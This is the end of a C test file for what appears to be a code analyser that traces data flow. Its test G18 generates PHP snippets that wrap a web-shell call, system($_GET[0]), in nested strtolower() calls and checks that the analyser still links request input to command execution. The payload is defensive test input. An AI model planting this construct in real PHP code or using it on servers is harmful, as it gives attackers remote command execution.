		/* strtolower(strtolower(... system($_GET[0]) ...)): the frame of system's own bracket is the one past the others, and the link into it needs it */
		sb_cat(&b, "<?php ");
		for (k = 0; k < depth[d]; k++)
			sb_cat(&b, "strtolower(");
		sb_cat(&b, "system($_GET[0])");
		for (k = 0; k < depth[d]; k++)
			sb_cat(&b, ")");
		sb_cat(&b, ";");
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		{
			int l = r.s ? linked(r.s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) : -1;

			CK(l == 1 || r.st != KGENOME_OK, "G18: system() inside %d brackets: the request reaches it: %d and the status is ok (the frames past the bound are dropped silently)", depth[d], l);
			CK(l == 1 && r.st == KGENOME_OK, "G18: system() inside %d brackets is read whole (link %d, status %d)", depth[d], l, (int)r.st);
		}
		done(&r);
		sb_free(&b);
	}
}

int main(void)
{
	g1();
	g2();
	g3();
	g4();
	g5();
	g6();
	g7();
	g7_cost();
	g8();
	g10();
	g11();
	g12_13();
	g14();
	g15();
	g18();
	if (fails) {
		printf("diag_text_defects: %d failure(s)\n", fails);
		return 1;
	}
	printf("diag_text_defects: ok\n");
	return 0;
}
